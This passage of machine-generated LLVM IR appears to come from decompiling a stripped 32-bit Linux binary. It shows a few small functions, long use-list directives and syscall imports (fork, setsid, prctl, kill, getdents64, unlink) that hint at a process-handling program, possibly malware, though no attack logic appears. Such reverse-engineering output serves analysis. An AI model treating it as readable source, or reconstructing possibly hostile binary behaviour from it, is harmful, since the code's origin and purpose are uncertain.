  uselistorder i32 12, { 43, 20, 21, 15, 16, 17, 8, 52, 53, 54, 55, 56, 57, 58, 44, 45, 46, 47, 48, 49, 50, 51, 9, 10, 11, 12, 13, 14, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 4, 40, 5, 18, 19, 41, 42, 59, 61, 62, 76, 89, 63, 70, 71, 1, 69, 60, 2, 66, 65, 77, 72, 6, 64, 67, 68, 73, 74, 75, 78, 79, 80, 81, 3, 82, 83, 84, 86, 87, 7, 85, 88, 0 }
  uselistorder i32* @global_var_8055158.70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80537cf, { 1, 0 }
}

define i32 @function_80537d5() local_unnamed_addr {
dec_label_pc_80537d5:
  %v0_80537d8 = load i32, i32* @eax, align 4
  %v1_80537da = sub i32 0, %v0_80537d8
  %v1_80537dc = call i32 @function_805149b(i32 ptrtoint (i32* @0 to i32))
  %v2_80537e1 = inttoptr i32 %v1_80537dc to i32*
  store i32 %v1_80537da, i32* %v2_80537e1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_805149b, { 41, 34, 45, 11, 33, 19, 44, 10, 20, 9, 5, 8, 43, 42, 40, 49, 7, 14, 6, 32, 48, 39, 38, 37, 47, 46, 36, 35, 31, 30, 29, 18, 4, 3, 28, 17, 27, 26, 25, 2, 13, 24, 23, 12, 21, 16, 1, 0, 22, 15 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 21, 9, 10, 11, 22, 23, 24, 7, 25 }
}

define i32 @function_80537f0() local_unnamed_addr {
dec_label_pc_80537f0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80537fc = load i32, i32* @global_var_8055004.57, align 4
  %v10_8053801 = icmp eq i32 %v0_80537fc, -1
  br i1 %v10_8053801, label %dec_label_pc_8053812, label %dec_label_pc_8053806.preheader

dec_label_pc_8053806.preheader:                   ; preds = %dec_label_pc_80537f0
  br label %dec_label_pc_8053806

dec_label_pc_8053806:                             ; preds = %dec_label_pc_8053806.preheader, %dec_label_pc_8053806
  %v4_8053809 = phi i32 [ %v0_80537fc, %dec_label_pc_8053806.preheader ], [ %v2_805380b, %dec_label_pc_8053806 ]
  %v0_8053806 = phi i32 [ ptrtoint (i32* @global_var_8055004.57 to i32), %dec_label_pc_8053806.preheader ], [ %v1_8053806, %dec_label_pc_8053806 ]
  %v1_8053806 = add i32 %v0_8053806, -4
  call void @__pseudo_call(i32 %v4_8053809)
  %v1_805380b = inttoptr i32 %v1_8053806 to i32*
  %v2_805380b = load i32, i32* %v1_805380b, align 4
  %v10_805380d = icmp eq i32 %v2_805380b, -1
  %v1_8053810 = icmp eq i1 %v10_805380d, false
  br i1 %v1_8053810, label %dec_label_pc_8053806, label %dec_label_pc_8053812.loopexit

dec_label_pc_8053812.loopexit:                    ; preds = %dec_label_pc_8053806
  %v2_8053812.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8053812

dec_label_pc_8053812:                             ; preds = %dec_label_pc_8053812.loopexit, %dec_label_pc_80537f0
  %v2_8053812 = phi i32 [ %v2_8053812.pre, %dec_label_pc_8053812.loopexit ], [ %tmp6, %dec_label_pc_80537f0 ]
  ret i32 %v2_8053812

; uselistorder directives
  uselistorder i32 %v0_80537fc, { 1, 0 }
  uselistorder i1 false, { 180, 72, 93, 94, 96, 95, 1, 73, 74, 75, 55, 56, 191, 192, 193, 194, 196, 26, 197, 198, 195, 190, 181, 42, 183, 184, 185, 3, 186, 187, 188, 189, 2, 83, 84, 85, 86, 87, 88, 77, 78, 79, 80, 81, 82, 76, 43, 44, 45, 46, 47, 48, 49, 50, 51, 57, 58, 59, 60, 6, 61, 62, 24, 64, 63, 67, 65, 66, 7, 27, 68, 69, 182, 52, 4, 53, 54, 114, 115, 29, 70, 71, 89, 102, 103, 116, 5, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 12, 127, 128, 129, 13, 130, 14, 131, 132, 97, 109, 30, 104, 105, 31, 106, 107, 32, 90, 91, 133, 110, 111, 112, 92, 98, 99, 100, 15, 16, 101, 108, 113, 134, 135, 136, 137, 34, 179, 138, 33, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 152, 35, 153, 154, 17, 23, 18, 22, 8, 155, 36, 156, 157, 158, 159, 37, 9, 38, 39, 19, 10, 11, 160, 0, 161, 162, 163, 40, 21, 20, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 25, 176, 177, 178, 149, 150, 151, 199, 41, 28, 200 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 50, 52, 53, 54, 4, 51, 1, 49, 12, 38, 5, 39, 40, 41, 6, 0, 2, 3, 42, 43, 44, 45, 46, 47, 48, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 ptrtoint (i32* @global_var_8055004.57 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 22, 23, 0, 83, 161, 47, 84, 15, 48, 85, 49, 86, 50, 87, 51, 88, 52, 89, 53, 90, 54, 91, 55, 92, 56, 93, 16, 17, 6, 5, 57, 58, 94, 59, 95, 60, 96, 24, 1, 97, 46, 61, 98, 162, 8, 9, 99, 7, 100, 25, 151, 26, 101, 149, 28, 29, 18, 13, 30, 62, 31, 102, 27, 150, 3, 103, 104, 19, 20, 21, 105, 10, 12, 32, 2, 63, 147, 148, 156, 157, 64, 152, 33, 65, 106, 66, 107, 67, 108, 44, 45, 109, 68, 110, 69, 111, 70, 112, 71, 113, 72, 114, 73, 115, 74, 116, 75, 117, 76, 118, 77, 119, 78, 120, 79, 121, 80, 122, 81, 123, 34, 155, 4, 11, 158, 124, 153, 38, 125, 36, 41, 126, 42, 127, 37, 43, 128, 159, 35, 129, 130, 131, 154, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 39, 160, 145, 146, 14, 40, 82 }
  uselistorder i32 1, { 155, 156, 32, 99, 100, 294, 0, 295, 101, 334, 157, 22, 21, 23, 158, 12, 11, 10, 159, 6, 160, 161, 3, 163, 162, 15, 164, 20, 165, 51, 166, 67, 167, 83, 168, 89, 169, 66, 170, 91, 171, 172, 8, 7, 9, 116, 47, 174, 173, 176, 175, 4, 177, 36, 179, 178, 38, 180, 184, 183, 182, 181, 52, 335, 336, 337, 187, 186, 185, 35, 34, 102, 188, 190, 189, 90, 103, 149, 252, 117, 191, 150, 194, 193, 192, 68, 118, 290, 291, 292, 195, 46, 285, 286, 104, 287, 288, 289, 18, 16, 17, 95, 284, 119, 69, 70, 71, 72, 120, 105, 255, 256, 257, 258, 198, 197, 196, 41, 42, 40, 43, 121, 199, 13, 14, 123, 261, 262, 263, 264, 265, 266, 267, 268, 269, 122, 270, 271, 272, 273, 274, 106, 275, 276, 92, 107, 277, 278, 279, 280, 108, 109, 281, 282, 283, 202, 201, 200, 56, 53, 54, 57, 55, 110, 111, 203, 112, 113, 207, 206, 205, 204, 27, 124, 151, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 259, 260, 220, 31, 30, 29, 221, 222, 125, 126, 223, 224, 114, 226, 225, 28, 127, 227, 228, 37, 229, 49, 230, 75, 231, 58, 232, 82, 233, 74, 234, 24, 235, 5, 236, 48, 19, 238, 237, 26, 239, 39, 240, 81, 242, 241, 64, 243, 65, 244, 25, 245, 50, 33, 247, 246, 76, 309, 115, 310, 311, 96, 316, 93, 44, 45, 312, 153, 84, 85, 87, 86, 313, 154, 59, 61, 60, 63, 62, 88, 296, 297, 298, 299, 300, 301, 143, 144, 129, 314, 133, 308, 131, 293, 141, 305, 139, 304, 317, 132, 302, 303, 140, 142, 137, 306, 138, 135, 307, 136, 134, 130, 128, 315, 318, 145, 319, 146, 320, 322, 333, 321, 323, 324, 325, 326, 327, 328, 331, 147, 332, 253, 94, 254, 78, 79, 77, 80, 329, 330, 152, 249, 248, 73, 1, 148, 2, 97, 98, 338, 251, 250 }
  uselistorder label %dec_label_pc_8053806, { 1, 0 }
}

define i32 @function_8053816() local_unnamed_addr {
entry:
  %v0_8053819 = load i32, i32* @ebx, align 4
  %v1_805381a = call i32 @function_80480b0(i32 %v0_8053819)
  store i32 %v1_805381a, i32* @eax, align 4
  %v0_8053825 = call i32 @function_80480c0()
  ret i32 %v0_8053825

; uselistorder directives
  uselistorder i32* @eax, { 7, 14, 35, 37, 38, 39, 40, 42, 9, 43, 0, 41, 4, 6, 36, 22, 24, 25, 23, 10, 11, 15, 16, 17, 18, 20, 21, 19, 1, 12, 13, 8, 2, 27, 26, 28, 32, 29, 30, 31, 44, 33, 34, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 206, 31, 150, 32, 266, 267, 4, 268, 269, 270, 5, 33, 67, 68, 207, 208, 34, 199, 241, 242, 243, 79, 244, 354, 245, 188, 200, 201, 355, 186, 185, 356, 357, 358, 187, 202, 203, 209, 210, 183, 359, 295, 16, 17, 360, 69, 367, 368, 6, 35, 151, 7, 152, 153, 378, 379, 61, 380, 36, 140, 37, 80, 81, 0, 361, 362, 363, 38, 184, 147, 366, 39, 369, 13, 141, 40, 70, 371, 374, 373, 11, 12, 254, 255, 248, 249, 250, 71, 251, 252, 253, 18, 19, 20, 21, 246, 82, 247, 83, 154, 189, 28, 190, 72, 155, 191, 211, 212, 213, 214, 215, 216, 217, 218, 219, 73, 74, 220, 156, 221, 157, 158, 84, 142, 159, 85, 143, 41, 160, 222, 223, 42, 43, 86, 144, 30, 224, 225, 226, 44, 45, 87, 145, 29, 227, 62, 228, 27, 229, 230, 232, 161, 231, 1, 372, 364, 365, 192, 193, 195, 194, 14, 15, 2, 75, 196, 197, 198, 271, 204, 205, 162, 163, 233, 234, 235, 236, 237, 238, 239, 240, 164, 256, 257, 296, 370, 258, 297, 259, 260, 261, 375, 76, 352, 262, 263, 353, 272, 298, 376, 377, 46, 47, 264, 49, 48, 50, 165, 299, 51, 166, 52, 167, 285, 168, 169, 273, 274, 275, 276, 170, 300, 349, 277, 171, 172, 301, 302, 287, 293, 294, 265, 288, 289, 290, 278, 279, 280, 281, 282, 283, 284, 286, 291, 292, 8, 64, 65, 60, 173, 53, 174, 303, 304, 22, 54, 175, 305, 306, 308, 55, 346, 347, 348, 63, 307, 176, 309, 310, 311, 312, 313, 314, 315, 316, 317, 323, 148, 318, 319, 320, 321, 322, 324, 177, 178, 56, 179, 327, 328, 329, 330, 331, 77, 23, 332, 333, 334, 180, 335, 336, 337, 341, 342, 343, 344, 345, 24, 78, 325, 326, 57, 146, 25, 338, 339, 340, 9, 26, 149, 10, 58, 181, 3, 350, 351, 59, 182, 66, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 381, 382, 383, 384, 385, 386, 387, 388 }
  uselistorder i32* @ebx, { 30, 131, 132, 81, 82, 55, 133, 5, 134, 135, 356, 136, 33, 34, 357, 32, 358, 359, 360, 361, 362, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 83, 6, 84, 85, 86, 31, 363, 364, 201, 202, 87, 88, 365, 366, 367, 28, 29, 385, 386, 387, 388, 26, 7, 25, 370, 379, 383, 384, 368, 369, 375, 376, 137, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 140, 141, 8, 142, 143, 138, 139, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 9, 46, 47, 48, 49, 50, 51, 52, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 27, 103, 104, 105, 106, 107, 10, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 373, 374, 53, 54, 74, 75, 76, 77, 78, 79, 80, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 154, 155, 156, 157, 158, 203, 204, 371, 372, 159, 205, 206, 160, 161, 162, 377, 378, 352, 353, 163, 164, 354, 355, 167, 168, 207, 208, 380, 381, 382, 165, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 189, 190, 180, 186, 187, 188, 185, 166, 182, 181, 191, 192, 193, 194, 183, 184, 195, 196, 197, 198, 199, 200, 244, 245, 246, 247, 248, 249, 11, 250, 251, 252, 254, 253, 264, 265, 266, 12, 267, 268, 269, 270, 271, 0, 272, 1, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 2, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 13, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 14, 313, 314, 315, 316, 3, 317, 318, 15, 319, 320, 16, 321, 322, 323, 324, 17, 325, 326, 4, 327, 328, 329, 330, 331, 332, 333, 334, 335, 18, 336, 337, 19, 338, 20, 339, 340, 341, 342, 343, 21, 22, 23, 344, 345, 24, 346, 347, 255, 256, 257, 258, 259, 260, 261, 262, 263, 348, 349, 350, 351 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_5() local_unnamed_addr

declare i64 @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
